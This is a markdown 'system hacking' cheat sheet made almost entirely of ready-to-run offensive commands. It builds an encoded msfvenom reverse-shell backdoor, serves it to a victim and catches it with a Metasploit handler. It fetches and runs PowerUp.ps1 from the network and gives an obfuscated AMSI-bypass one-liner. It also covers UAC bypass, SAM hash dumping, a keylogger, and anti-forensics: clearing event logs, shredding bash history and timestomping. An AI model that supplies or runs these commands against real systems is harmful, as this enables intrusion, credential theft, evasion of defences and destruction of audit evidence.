## System hacking cheat sheet

### Getting shell with msfvenom and use PowerUp.ps1 to escalate privileges

#### Generate payload and encode using msfvenom

```sh
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=[Port in the Host Machine] -o [Output Path/shellcode.exe]
```

```sh
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=[IP Address of Host Machine] -f exe > Desktop/Backdoor.exe
```
[msfvenom documentation](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

#### Upload shellcode using a local server

```sh
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
cp [PATH]/shellcode.exe /var/www/html/share

service apache2 start
```

Download it to the victim machine `[IP Address of Host Machine]/share/shellcode.exe`.

#### Using handler in metasploit to connect to the payload

```sh
use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp
set LHOST [IP Address of Host Machine]
set LPORT [Port in the Host Machine]
exploit 
```

#### Upload PowerUp.ps1

```sh
upload [PATH]/PowerUp.ps1 PowerUp.ps1
```

#### PowerUp.ps1

##### Check all vulnerabilities

```sh
shell
poweshell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```
[PowerUp.ps1 tutorial](https://recipeforroot.com/advanced-powerup-ps1-usage/)

`bypass` is used to bypass PowerShell’s execution policy.

For disable [AMSI](https://docs.microsoft.com/en-us/archive/blogs/poshchap/security-focus-defending-powershell-with-the-anti-malware-scan-interface-amsi):

```sh
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

###### Excute PowerUp.ps1 without upload the script

```sh
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1'); Invoke-AllChecks"
```

##### Escalate privileges

```sh
Invoke-ServiceAbuse -Name 'Name of the vulnerable service'
```

### Attemp to bypass Windows UAC protection via the FodHelper Registry Key usind bypassuac_fodhelper exploit

```sh
use exploit/windows/local/bypassuac_fodhelper
```

If it works, in some cases we can already escalate privileges with some techniques like `getsystem`.

### Attemp to elevate privileges with Meterpreter

```sh
getsystem -t 1
```

### Obtain password hashes in the SAM file using Metasploit (root requiered)

```sh
run post/windows/gather/smart_hashdump
```

It uses the service [Named Pipe Impersonation (In Memory/Admin) Technique](https://securityintelligence.com/identifying-named-pipe-impersonation-and-other-malicious-privilege-escalation-techniques/).

### Clear the events logs that require administrative or root privileges using Meterpreter (root requiered)

```sh
clearev
```

### Clear all event viewer logs using wevtutil (Windows)

```sh
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
```

```sh
@echo off

FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo All Event Logs have been cleared!
goto theEnd

:do_clear
echo clearing %1
wevtutil.exe cl %1
goto :eof

:noAdmin
echo Current user permissions to execute this .BAT file are inadequate.
echo This .BAT file must be run with administrative privileges.
echo Exit now, right click on this .BAT file, and select "Run as administrator".  
pause >nul

:theEnd
Exit
```

### Securely delete a chunk of data by overwriting it to prevent its possible recovery using in-built Windows tool (Windows)

```sh
cipher /w:[Drive or Folder or File Location] 
```

### Avoid bash history

#### Disable the BASH shell from saving the history (Linux)

```sh
export HISTSIZE=0
```

#### Make bash history unreadable (Linux)

```sh
shred ~/.bash_history
```

```sh
shred ~/.bash_history && cat /dev/null > .bash_history
```

### Leave no trace of MACE attributes when reading or modifying files using Meterpreter

#### To view the mace attributes of a file (Windows)

```sh
timestomp [FILE] -v
```

#### Change MACE attributes (Windows)

```sh
timestomp [FILE] -m "mm/dd/yyyy hh:mm:ss"
```

### Kylogger using Meterpreter

#### Start keylogger

```sh
keyscan_start
```

#### Read keylogger log

```sh
keyscan_dump
```

## License

© 2021 [javierizquierdovera.com](https://javierizquierdovera.com)

Licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0) ([`LICENSE-APACHE`](LICENSE-APACHE)) or the [MIT license](https://opensource.org/licenses/MIT) ([`LICENSE-MIT`](LICENSE-MIT)), at your option.

`SPDX-License-Identifier: (Apache-2.0 OR MIT)`